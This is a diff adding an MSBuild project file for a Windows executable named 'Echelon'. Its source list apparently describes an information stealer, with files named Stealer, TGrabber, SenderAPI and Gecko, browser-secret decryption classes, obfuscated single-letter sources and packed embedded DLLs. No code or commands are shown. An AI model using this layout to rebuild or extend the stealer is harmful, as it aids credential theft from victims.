@@ -1,0 +1,192 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <ProjectGuid>{A7470CAF-6CB4-4D81-A89B-BA330D081639}</ProjectGuid>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <OutputType>WinExe</OutputType>
+    <LangVersion>8.0</LangVersion>
+    <AssemblyName>Echelon</AssemblyName>
+    <TargetFrameworkIdentifier>.NETFramework</TargetFrameworkIdentifier>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Platform)' == 'AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)' == 'Debug' ">
+    <OutputPath>bin\Debug\</OutputPath>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)' == 'Release' ">
+    <OutputPath>bin\Release\</OutputPath>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System">
+      <HintPath>C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Windows.Forms">
+      <HintPath>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Windows.Forms\v4.0_4.0.0.0__b77a5c561934e089\System.Windows.Forms.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core">
+      <HintPath>C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Core\v4.0_4.0.0.0__b77a5c561934e089\System.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Management">
+      <HintPath>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Management.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Drawing">
+      <HintPath>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Drawing\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Drawing.dll</HintPath>
+    </Reference>
+    <Reference Include="PresentationCore">
+      <HintPath>C:\Windows\Microsoft.Net\assembly\GAC_64\PresentationCore\v4.0_4.0.0.0__31bf3856ad364e35\PresentationCore.dll</HintPath>
+    </Reference>
+    <Reference Include="System.IO.Compression.FileSystem">
+      <HintPath>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.IO.Compression.FileSystem\v4.0_4.0.0.0__b77a5c561934e089\System.IO.Compression.FileSystem.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml">
+      <HintPath>C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Xml\v4.0_4.0.0.0__b77a5c561934e089\System.Xml.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic">
+      <HintPath>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.VisualBasic\v4.0_10.0.0.0__b03f5f7f11d50a3a\Microsoft.VisualBasic.dll</HintPath>
+    </Reference>
+    <Reference Include="Decoder" />
+    <Reference Include="System.Data">
+      <HintPath>C:\Windows\Microsoft.NET\assembly\GAC_32\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Security">
+      <HintPath>C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Security\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Security.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="a.cs" />
+    <Compile Include="aa.cs" />
+    <Compile Include="ab.cs" />
+    <Compile Include="ac.cs" />
+    <Compile Include="ad.cs" />
+    <Compile Include="ae.cs" />
+    <Compile Include="af.cs" />
+    <Compile Include="ag.cs" />
+    <Compile Include="ah.cs" />
+    <Compile Include="ai.cs" />
+    <Compile Include="aj.cs" />
+    <Compile Include="ak.cs" />
+    <Compile Include="al.cs" />
+    <Compile Include="am.cs" />
+    <Compile Include="an.cs" />
+    <Compile Include="ao.cs" />
+    <Compile Include="ap.cs" />
+    <Compile Include="aq.cs" />
+    <Compile Include="ar.cs" />
+    <Compile Include="as.cs" />
+    <Compile Include="at.cs" />
+    <Compile Include="au.cs" />
+    <Compile Include="av.cs" />
+    <Compile Include="aw.cs" />
+    <Compile Include="ax.cs" />
+    <Compile Include="ay.cs" />
+    <Compile Include="az.cs" />
+    <Compile Include="b.cs" />
+    <Compile Include="ba.cs" />
+    <Compile Include="bb.cs" />
+    <Compile Include="bc.cs" />
+    <Compile Include="bd.cs" />
+    <Compile Include="be.cs" />
+    <Compile Include="bf.cs" />
+    <Compile Include="bg.cs" />
+    <Compile Include="c.cs" />
+    <Compile Include="d.cs" />
+    <Compile Include="e.cs" />
+    <Compile Include="Echelon.Properties\Resources.cs" />
+    <Compile Include="Echelon\AeadParameters.cs" />
+    <Compile Include="Echelon\AesFastEngine.cs" />
+    <Compile Include="Echelon\AesGcm256.cs" />
+    <Compile Include="Echelon\Arrays.cs" />
+    <Compile Include="Echelon\CNT.cs" />
+    <Compile Include="Echelon\CryptoException.cs" />
+    <Compile Include="Echelon\DataLengthException.cs" />
+    <Compile Include="Echelon\DesktopWriter.cs" />
+    <Compile Include="Echelon\FF.cs" />
+    <Compile Include="Echelon\GcmBlockCipher.cs" />
+    <Compile Include="Echelon\Gecko1.cs" />
+    <Compile Include="Echelon\Gecko2.cs" />
+    <Compile Include="Echelon\Gecko3.cs" />
+    <Compile Include="Echelon\Gecko4.cs" />
+    <Compile Include="Echelon\Gecko5.cs" />
+    <Compile Include="Echelon\Gecko6.cs" />
+    <Compile Include="Echelon\Gecko7.cs" />
+    <Compile Include="Echelon\Gecko8.cs" />
+    <Compile Include="Echelon\Gecko9.cs" />
+    <Compile Include="Echelon\GetFiles.cs" />
+    <Compile Include="Echelon\Global.cs" />
+    <Compile Include="Echelon\IAeadBlockCipher.cs" />
+    <Compile Include="Echelon\IBlockCipher.cs" />
+    <Compile Include="Echelon\ICipherParameters.cs" />
+    <Compile Include="Echelon\IFolders.cs" />
+    <Compile Include="Echelon\IGcmMultiplier.cs" />
+    <Compile Include="Echelon\Internet.cs" />
+    <Compile Include="Echelon\InvalidCipherTextException.cs" />
+    <Compile Include="Echelon\IsNullExtension.cs" />
+    <Compile Include="Echelon\JavaScriptReader.cs" />
+    <Compile Include="Echelon\JsonArray.cs" />
+    <Compile Include="Echelon\JsonExt.cs" />
+    <Compile Include="Echelon\JsonObject.cs" />
+    <Compile Include="Echelon\JsonPrimitive.cs" />
+    <Compile Include="Echelon\JsonType.cs" />
+    <Compile Include="Echelon\JsonValue.cs" />
+    <Compile Include="Echelon\KeyParameter.cs" />
+    <Compile Include="Echelon\ParametersWithIV.cs" />
+    <Compile Include="Echelon\ROW.cs" />
+    <Compile Include="Echelon\SenderAPI.cs" />
+    <Compile Include="Echelon\Stealer.cs" />
+    <Compile Include="Echelon\StringExtension.cs" />
+    <Compile Include="Echelon\SZ.cs" />
+    <Compile Include="Echelon\Tables8kGcmMultiplier.cs" />
+    <Compile Include="Echelon\TGrabber.cs" />
+    <Compile Include="f.cs" />
+    <Compile Include="g.cs" />
+    <Compile Include="h.cs" />
+    <Compile Include="i.cs" />
+    <Compile Include="j.cs" />
+    <Compile Include="k.cs" />
+    <Compile Include="l.cs" />
+    <Compile Include="m.cs" />
+    <Compile Include="n.cs" />
+    <Compile Include="o.cs" />
+    <Compile Include="p.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="q.cs" />
+    <Compile Include="r.cs" />
+    <Compile Include="s.cs" />
+    <Compile Include="SimpleJSON\JSON.cs" />
+    <Compile Include="SimpleJSON\JSONArray.cs" />
+    <Compile Include="SimpleJSON\JSONBool.cs" />
+    <Compile Include="SimpleJSON\JSONNode.cs" />
+    <Compile Include="SimpleJSON\JSONNodeType.cs" />
+    <Compile Include="SimpleJSON\JSONNull.cs" />
+    <Compile Include="SimpleJSON\JSONNumber.cs" />
+    <Compile Include="SimpleJSON\JSONObject.cs" />
+    <Compile Include="SimpleJSON\JSONString.cs" />
+    <Compile Include="SimpleJSON\JSONTextMode.cs" />
+    <Compile Include="t.cs" />
+    <Compile Include="u.cs" />
+    <Compile Include="v.cs" />
+    <Compile Include="w.cs" />
+    <Compile Include="x.cs" />
+    <Compile Include="y.cs" />
+    <Compile Include="z.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="costura.costura.dll.compressed" />
+    <EmbeddedResource Include="costura.decoder.dll.compressed" />
+    <EmbeddedResource Include="Echelon.Properties\Resources.resx" />
+    <EmbeddedResource Include="olFL" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
